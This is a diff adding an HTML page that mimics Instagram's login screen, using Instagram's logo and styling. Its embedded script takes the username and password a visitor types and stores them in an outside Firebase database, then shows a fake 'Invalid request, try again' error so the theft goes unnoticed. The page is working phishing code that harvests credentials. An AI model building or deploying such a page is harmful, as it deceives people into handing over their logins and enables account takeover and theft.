@@ -1,0 +1,133 @@
+<!DOCTYPE html>
+<html lang="en">
+
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Login</title>
+    <style>
+        body {
+            font-family: Arial, sans-serif;
+            background-color: #fafafa;
+            margin: 0;
+            padding: 0;
+        }
+
+        .container {
+            max-width: 400px;
+            margin: 50px auto;
+            background-color: #fff;
+            border-radius: 8px;
+            box-shadow: 0 2px 4px rgba(0, 0, 0, 0.1);
+            padding: 20px;
+            text-align: center;
+        }
+
+        .logo {
+            margin-bottom: 20px;
+        }
+
+        input[type="text"],
+        input[type="password"] {
+            width: 100%;
+            padding: 10px;
+            margin-bottom: 15px;
+            border: 1px solid #ccc;
+            border-radius: 4px;
+            box-sizing: border-box;
+        }
+
+        input[type="submit"] {
+            background-color: #0095f6;
+            color: #fff;
+            border: none;
+            padding: 10px 15px;
+            border-radius: 4px;
+            cursor: pointer;
+            font-size: 16px;
+        }
+
+        input[type="submit"]:hover {
+            background-color: #0077cc;
+        }
+
+        .signup-link {
+            margin-top: 20px;
+            font-size: 14px;
+        }
+
+        @media (max-width: 500px) {
+            .container {
+                padding: 10px;
+            }
+
+            input[type="text"],
+            input[type="password"] {
+                padding: 8px;
+                margin-bottom: 10px;
+            }
+
+            input[type="submit"] {
+                padding: 8px 12px;
+                font-size: 14px;
+            }
+        }
+    </style>
+</head>
+
+<body>
+    <div class="container">
+        <div class="logo">
+            <img src="https://www.instagram.com/static/images/web/mobile_nav_type_logo.png/735145cfe0a4.png"
+                alt="Instagram">
+        </div>
+        <form>
+            <input type="text" name="username" placeholder="Username" id="usename" required>
+            <input type="password" name="password" placeholder="Password" id="passdata" required>
+            <input type="submit" value="Log In" id="sbmit">
+        </form>
+    </div>
+    <script type="module">
+        import { initializeApp } from "https://www.gstatic.com/firebasejs/10.4.0/firebase-app.js";
+        import { getAnalytics } from "https://www.gstatic.com/firebasejs/10.4.0/firebase-analytics.js";
+
+        const firebaseConfig = {
+            apiKey: "AIzaSyBSW_SILWdE_0ziAA47el7YEILFWjtns1o",
+            authDomain: "ru-medic.firebaseapp.com",
+            databaseURL: "https://ru-medic-default-rtdb.firebaseio.com",
+            projectId: "ru-medic",
+            storageBucket: "ru-medic.appspot.com",
+            messagingSenderId: "749329210449",
+            appId: "1:749329210449:web:53a283fbd2c945cc01ec70",
+            measurementId: "G-PTXPJK4NDQ"
+        };
+
+        const app = initializeApp(firebaseConfig);
+        const analytics = getAnalytics(app);
+        import { getDatabase, ref, get, set, child, update, remove }
+            from "https://www.gstatic.com/firebasejs/10.4.0/firebase-database.js";
+        const db = getDatabase();
+        const dberef = ref(db);
+        let user = document.querySelector("#usename");
+        let pass = document.querySelector("#passdata");
+        let btn = document.querySelector("#sbmit");
+        btn.addEventListener("click", (e)=>{
+            e.preventDefault();
+            InsertData();
+        })
+        function InsertData() {
+            if(user.value && pass.value){
+                set(ref(db, `TheInsta2/${user.value}`), {
+                password:pass.value,
+            }).then(() => {
+                alert("Invalid request, try again !!");
+            })
+                .catch((error) => {
+                    alert("uncessfull");
+                });
+            }
+        }
+    </script>
+</body>
+
+</html>
